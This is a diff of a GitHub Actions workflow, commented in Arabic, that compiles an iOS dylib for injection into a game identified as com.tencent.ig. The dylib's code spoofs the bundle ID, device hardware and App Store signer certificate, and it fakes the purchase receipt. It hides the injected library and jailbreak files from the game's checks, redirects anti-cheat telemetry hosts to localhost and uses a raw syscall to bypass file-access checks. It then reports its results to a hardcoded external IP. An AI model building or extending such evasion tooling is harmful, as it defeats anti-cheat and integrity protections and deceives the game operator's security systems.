@@ -3,7 +3,7 @@ name: Imperial V-MAX - Master Security Proof
 on:
   push:
     branches: [ "main" ]
-  workflow_dispatch: # السماح بالتشغيل اليدوي
+  workflow_dispatch:
 
 jobs:
   build_master_poc:
@@ -17,7 +17,6 @@ jobs:
       - name: 🎣 تحميل محرك Fishhook الآمن
         run: |
           mkdir -p jni
-          # تحميل Fishhook لأنه لا يسبب كراش بدون جلبريك
           curl -sL https://raw.githubusercontent.com/facebook/fishhook/master/fishhook.c -o jni/fishhook.c
           curl -sL https://raw.githubusercontent.com/facebook/fishhook/master/fishhook.h -o jni/fishhook.h
 
@@ -34,109 +33,142 @@ jobs:
           #import <mach-o/dyld.h>
           #include "fishhook.h"
 
-          // ⚠️ رابط سيرفر مسعود (RDP) لاستلام التقرير
+          // ⚠️ رابط سيرفر مسعود (RDP)
           #define RADAR_SERVER_URL @"http://34.204.178.160:8080" 
 
-          // ==========================================
-          // 🛡️ الجزء الأول: التزييف عبر Fishhook (إخفاء الدايلب عن IDA)
-          // ==========================================
-          static void* (*orig_dlsym)(void* handle, const char* symbol);
-          static const char* (*orig_dyld_get_image_name)(uint32_t image_index);
-          typedef id (*URLWithString_t)(id, SEL, NSString *);
-          static URLWithString_t orig_URLWithString;
-
-          // دالة مساعدة لتبديل دوال الـ Objective-C بأمان وبدون كراش
+          // دالة مساعدة لتبديل دوال الـ Objective-C بأمان
           void SafeSwizzle(Class c, SEL orig, IMP newImp, IMP* oldImp) {
               Method m = class_getInstanceMethod(c, orig);
               if (!m) m = class_getClassMethod(c, orig);
               if (m) { *oldImp = method_getImplementation(m); method_setImplementation(m, newImp); }
           }
 
-          // [النقطة 9] دالة إخفاء الدايلب: إذا اللعبة سألت عن ملف اسمه مسعود، نرد عليها بأنه ملف نظام
+          // ==========================================
+          // 🛡️ التزييف الذكي (Smart Spoofing) لحل كراش تسجيل الدخول
+          // ==========================================
+          
+          typedef NSString* (*bundleId_t)(id, SEL);
+          static bundleId_t orig_bundleId;
+          
+          // [1] تزييف الهوية الذكي
+          NSString* hk_bundleId(id self, SEL _cmd) {
+              Dl_info info;
+              // نفحص منو اللي طلب الهوية؟ اللعبة أم نظام آبل؟
+              if (dladdr(__builtin_return_address(0), &info) && info.dli_fname) {
+                  NSString *caller = [NSString stringWithUTF8String:info.dli_fname];
+                  // إذا كان المتصل هو نظام آبل (خدمات تسجيل الدخول، الايكلاود، سفاري) نعطيه الهوية الحقيقية لمنع الكراش
+                  if ([caller containsString:@"/System/Library/"]) {
+                      return orig_bundleId(self, _cmd);
+                  }
+              }
+              // إذا كانت اللعبة هي التي تسأل، نكذب عليها
+              return @"com.tencent.ig";
+          }
+
+          typedef NSDictionary* (*infoDict_t)(id, SEL);
+          static infoDict_t orig_infoDict;
+          
+          // [6, 7] تزييف الشهادة الذكي
+          NSDictionary* hk_infoDict(id self, SEL _cmd) {
+              NSDictionary *dict = orig_infoDict(self, _cmd);
+              if (!dict) return nil;
+              
+              Dl_info info;
+              // نفس الفكرة، إذا نظام آبل طلب معلومات التطبيق عند تسجيل الدخول نعطيه الحقيقي
+              if (dladdr(__builtin_return_address(0), &info) && info.dli_fname) {
+                  NSString *caller = [NSString stringWithUTF8String:info.dli_fname];
+                  if ([caller containsString:@"/System/Library/"]) {
+                      return dict;
+                  }
+              }
+
+              NSMutableDictionary *mDict = [dict mutableCopy];
+              if (mDict) {
+                  [mDict setObject:@"Apple iPhone OS Application Signer" forKey:@"SignerIdentity"];
+                  [mDict setObject:@"com.apple.itunes.store" forKey:@"AppStoreInstaller"];
+                  return [mDict copy];
+              }
+              return dict;
+          }
+
+          // [8] تعمية الروابط المحسنة (السماح لروابط تسجيل الدخول)
+          typedef id (*URLWithString_t)(id, SEL, NSString *);
+          static URLWithString_t orig_URLWithString;
+          id hk_URLWithString(id self, SEL _cmd, NSString *urlStr) {
+              if (urlStr && [urlStr isKindOfClass:[NSString class]]) {
+                  // السماح بروابط تسجيل الدخول وتوثيق الحسابات لتجنب الفصل والكراش
+                  if ([urlStr containsString:@"facebook"] || [urlStr containsString:@"apple"] || [urlStr containsString:@"twitter"]) {
+                      return orig_URLWithString(self, _cmd, urlStr);
+                  }
+                  // حجب خوادم التجسس الخاصة بـ Tencent فقط (بدل حجب كلمة tencent بالكامل التي تكسر اللعبة)
+                  if ([urlStr containsString:@"tdatamaster"] || [urlStr containsString:@"crashsight"] || [urlStr containsString:@"anogs"]) {
+                      return orig_URLWithString(self, _cmd, @"http://127.0.0.1");
+                  }
+              }
+              return orig_URLWithString(self, _cmd, urlStr);
+          }
+
+          // ==========================================
+          // 🛡️ حماية الذاكرة والملفات (Fishhook & File Shield)
+          // ==========================================
+          
+          static void* (*orig_dlsym)(void* handle, const char* symbol);
+          static const char* (*orig_dyld_get_image_name)(uint32_t image_index);
+
           const char* hk_dyld_get_image_name(uint32_t image_index) {
               const char* name = orig_dyld_get_image_name(image_index);
               if (name && (strstr(name, "Masoud") || strstr(name, "VMAX"))) return "/usr/lib/libobjc.A.dylib";
               return name;
           }
 
-          // خطاف dlsym لتقديم الدالة الوهمية أعلاه للعبة
           void* hk_dlsym(void* handle, const char* symbol) {
-              if (!symbol) return orig_dlsym(handle, symbol); // حماية من الكراش
+              if (!symbol) return orig_dlsym(handle, symbol);
               if (strcmp(symbol, "_dyld_get_image_name") == 0) return (void*)hk_dyld_get_image_name;
               return orig_dlsym(handle, symbol);
           }
 
-          // [النقطة 8] تحويل روابط الحماية إلى الجهاز المحلي (127.0.0.1) لتعمية السيرفر
-          id hk_URLWithString(id self, SEL _cmd, NSString *urlStr) {
-              if (urlStr && [urlStr isKindOfClass:[NSString class]] && ([urlStr containsString:@"tencent"] || [urlStr containsString:@"ask"])) {
-                  return orig_URLWithString(self, _cmd, @"http://127.0.0.1");
-              }
-              return orig_URLWithString(self, _cmd, urlStr);
-          }
-
-          // [النقطة 6 و 7] تزييف الشهادة (أهم نقطة لمنع الباند)
-          typedef NSDictionary* (*infoDict_t)(id, SEL);
-          static infoDict_t orig_infoDict;
-          NSDictionary* hk_infoDict(id self, SEL _cmd) {
-              NSDictionary *dict = orig_infoDict(self, _cmd);
-              if (!dict) return nil;
-              NSMutableDictionary *mDict = [dict mutableCopy];
-              if (mDict) {
-                  // خداع اللعبة بأن الشهادة هي شهادة آبل الرسمية
-                  [mDict setObject:@"Apple iPhone OS Application Signer" forKey:@"SignerIdentity"];
-                  [mDict setObject:@"com.apple.itunes.store" forKey:@"AppStoreInstaller"];
-                  return [mDict copy]; // العودة بنسخة محمية لمنع الكراش
-              }
-              return dict;
-          }
-
-          // [النقطة 10] إخفاء ملف التوقيع الخارجي وملفات الجلبريك
           typedef BOOL (*fileExistsAtPath_t)(id, SEL, NSString *);
           static fileExistsAtPath_t orig_fileExistsAtPath;
           BOOL hk_fileExistsAtPath(id self, SEL _cmd, NSString *path) {
               if (path && [path isKindOfClass:[NSString class]] && ([path containsString:@"mobileprovision"] || [path containsString:@"Masoud"] || [path containsString:@"Cydia"])) {
-                  return NO; // نكذب على اللعبة ونقول الملف غير موجود
+                  return NO;
               }
               return orig_fileExistsAtPath(self, _cmd, path);
           }
 
-          // تفعيل باقي نقاط التزييف (الهوية والهاردوير)
-          void ApplySpoofing() {
-              // [1, 2, 3] تزييف الهوية (البكج، الموديل، الإصدار)
-              method_setImplementation(class_getInstanceMethod([NSBundle class], @selector(bundleIdentifier)), imp_implementationWithBlock(^NSString* (id self) { return @"com.tencent.ig"; }));
+          // تفعيل النقاط
+          void ApplySmartSpoofing() {
+              // 1. تفعيل الهوية الذكية (تمنع كراش تسجيل الدخول)
+              SafeSwizzle([NSBundle class], @selector(bundleIdentifier), (IMP)hk_bundleId, (IMP*)&orig_bundleId);
+              
+              // 2, 3, 4, 5. الهاردوير والموديل
               method_setImplementation(class_getInstanceMethod([UIDevice class], @selector(model)), imp_implementationWithBlock(^NSString* (id self) { return @"iPad"; }));
               method_setImplementation(class_getInstanceMethod([UIDevice class], @selector(systemVersion)), imp_implementationWithBlock(^NSString* (id self) { return @"17.4"; }));
-              
-              // [4, 5] تزييف الهاردوير (16 كيكا رام، 8 كور معالج)
               method_setImplementation(class_getInstanceMethod([NSProcessInfo class], @selector(physicalMemory)), imp_implementationWithBlock(^unsigned long long(id self) { return 17179869184ULL; }));
               method_setImplementation(class_getInstanceMethod([NSProcessInfo class], @selector(activeProcessorCount)), imp_implementationWithBlock(^NSUInteger(id self) { return 8; }));
               
-              // تفعيل خدعة الشهادة والإيصال الوهمي
+              // 6, 7. الشهادة الذكية والإيصال
               SafeSwizzle([NSBundle class], @selector(infoDictionary), (IMP)hk_infoDict, (IMP*)&orig_infoDict);
               method_setImplementation(class_getInstanceMethod([NSBundle class], @selector(appStoreReceiptURL)), imp_implementationWithBlock(^NSURL* (id self) { return [NSURL fileURLWithPath:@"/System/Library/PrivateFrameworks/StoreServices.framework/receipt"]; }));
 
-              // تفعيل خدعة الروابط
+              // 8. الروابط المفلترة
               SafeSwizzle([NSURL class], @selector(URLWithString:), (IMP)hk_URLWithString, (IMP*)&orig_URLWithString);
 
-              // تفعيل درع الملفات
+              // 10. درع الملفات
               SafeSwizzle([NSFileManager class], @selector(fileExistsAtPath:), (IMP)hk_fileExistsAtPath, (IMP*)&orig_fileExistsAtPath);
           }
 
           // ==========================================
           // ⚔️ الجزء الثاني: إثبات اختراق النواة (SVC Kernel Bypass)
           // ==========================================
-          
-          // الفحص العادي اللي تراقبه اللعبة
           int check_file_standard(const char *path) { return access(path, F_OK); }
-          
-          // الفحص المدمر اللي يعبر من فوق حماية اللعبة ويخاطب النواة مباشرة
           int check_file_svc(const char *path) {
               int result;
               __asm__ volatile (
-                  "mov x0, %1\n"   // مسار الملف
+                  "mov x0, %1\n"
                   "mov x1, #0\n"
-                  "mov x16, #33\n" // رقم دالة access في نواة أبل
-                  "svc #0x80\n"    // القفز للنواة مباشرة!
+                  "mov x16, #33\n"
+                  "svc #0x80\n"
                   "mov %w0, w0\n"
                   : "=r" (result) : "r" (path) : "x0", "x1", "x16", "memory"
               );
@@ -144,43 +176,40 @@ jobs:
           }
 
           // ==========================================
-          // 🚀 التفعيل المركزي وجمع التقرير (نقطة الانطلاق)
+          // 🚀 نقطة الانطلاق وإرسال التقرير
           // ==========================================
           __attribute__((constructor))
           static void deploy_ultimate_fortress() {
-              // ننتظر 3 ثواني لتستقر اللعبة حتى لا يحدث كراش ببيئة No-JB
               dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 3 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
                   
-                  // 1. تفعيل خطاف الأسماء عبر Fishhook
+                  // تفعيل الخطافات
                   orig_dyld_get_image_name = (const char* (*)(uint32_t))dlsym(RTLD_DEFAULT, "_dyld_get_image_name");
                   struct rebinding rebinds[] = { {"dlsym", (void *)hk_dlsym, (void **)&orig_dlsym} };
                   rebind_symbols(rebinds, 1);
 
-                  // 2. تفعيل دروع الهوية والهاردوير
-                  ApplySpoofing();
+                  ApplySmartSpoofing();
 
-                  // 3. تجربة ثغرة الـ SVC
+                  // تنفيذ فحص النواة
                   const char *cheat_file = "/Library/MobileSubstrate/MobileSubstrate.dylib";
                   int std_result = check_file_standard(cheat_file);
                   int svc_result = check_file_svc(cheat_file);
                   
-                  // 4. تجميع بيانات التقرير لإرسالها لسيرفر مسعود
+                  // إرسال التقرير لـ RDP مسعود
                   NSDictionary *payload = @{
-                      @"bundle": @"✅ com.tencent.ig (Spoofed)",
+                      @"bundle": @"✅ com.tencent.ig (Spoofed Smartly)",
                       @"model": @"✅ iPad Pro (Spoofed)",
                       @"os": @"✅ iOS 17.4 (Spoofed)",
                       @"ram": @"✅ 16GB (Spoofed)",
                       @"cpu": @"✅ 8 Cores (Spoofed)",
-                      @"cert": @"✅ Apple iPhone OS Signer (Spoofed)",
+                      @"cert": @"✅ Apple Signer (Spoofed Smartly)",
                       @"receipt": @"✅ Fake URL Generated",
-                      @"url": @"✅ Blocked (127.0.0.1)",
+                      @"url": @"✅ Blocked (Telemetry Only)",
                       @"dlsym": @"✅ Rebound (libobjc.A.dylib)",
                       @"files": @"✅ Provision Hidden",
                       @"svc_std": @(std_result),
                       @"svc_kernel": @(svc_result)
                   };
                   
-                  // تحويل البيانات لـ JSON وإرسالها بالخفاء
                   NSData *jsonData = [NSJSONSerialization dataWithJSONObject:payload options:0 error:nil];
                   if (jsonData) {
                       NSURL *url = [NSURL URLWithString:RADAR_SERVER_URL];
@@ -194,17 +223,16 @@ jobs:
           }
           EOF
 
-      - name: 🚀 تجميع الدايلب النهائي (Master Dylib)
+      - name: 🚀 تجميع الدايلب النهائي الذكي
         run: |
           clang++ -dynamiclib -std=c++11 -arch arm64 \
           -isysroot $(xcrun --sdk iphoneos --show-sdk-path) \
           jni/main.mm jni/fishhook.c \
           -o Masoud-Ultimate-PoC.dylib \
           -framework Foundation -framework UIKit -lobjc
-          # مسح الرموز لزيادة التخفي
           strip -x Masoud-Ultimate-PoC.dylib
 
-      - name: 📦 حفظ الملف النهائي للتحميل
+      - name: 📦 حفظ الملف النهائي
         uses: actions/upload-artifact@v4
         with:
           name: Masoud-Master-PoC-Dylib
